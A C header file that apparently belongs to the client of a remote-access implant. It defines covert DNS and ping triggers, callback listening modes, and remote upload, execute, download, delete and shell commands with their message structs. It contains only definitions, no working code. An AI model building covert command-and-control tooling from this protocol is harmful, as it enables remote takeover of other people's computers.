/** \file hclient.h
 *
 */

#ifndef _ILM_CLIENT_H
#define _ILM_CLIENT_H

/* Preprocessor Macros */
#define DEFAULT_DELAY     30								/* default trigger delay */
#define YES               1
#define NO                0
#define ERROR             -1

/* FOLLOWING DEFINITIONS FOR EXIT THROUGH HELP ARE ALSO IN servers Shell.h file */
#define UPLOAD				1			/* command = ul for upload */
#define EXECUTE				2			/* command = exec for execute */
#define UPLOADEXECUTE		3			/* not implemented att */
#define DOWNLOAD			4			/* command = dl for download */
#define DELETE				5			/* command = del for delete */
#define SHUTDOWNBOTH		6			/* command = shut for shutdown, compat.h defines SHUTDOWN as 2 for sockets */
#define HELP				7			/* command = help */
#define LAUNCHTRUESHELL		8
#define EXIT				10			/* command = ex for exit */

#ifndef SUCCESS
#define SUCCESS	0
#endif

#ifndef FAILURE
#define FAILURE	-1
#endif

// client modes
#define TRIGGER_ONLY		1								/* mode where client will only send triggers */
#define LISTEN_ONLY			2								/* mode where client will only listen for callbacks */
#define TRIGGER_LISTEN		3								/* mode where client will send triggers and then listen for callbacks */

#define TRIG_NONE			0		/* default trigger */
#define TRIG_DNS			1		/* use DNS triggers */
#define TRIG_PING			2		/* use PING triggers */


struct send_buf
{
   unsigned char command;    /* equivalent to proc_vars.command */
   char path[255];           /* filename of the file/application to be executed, uploaded, downloaded, or deleted */
   unsigned long size;       /* size of the file being uploaded to the remote computer */
   unsigned long padding;    /* not used att ... filled with random bytes */
};

struct recv_buf
{
   unsigned long reply;      /* reply code from the remote computer; reply == 0 then successful command */
   unsigned long padding;    /* size of the file being downloaded to the local computer */
};

typedef struct _REPLY {
        unsigned long   reply;
        unsigned long   padding;
} REPLY;

#endif 
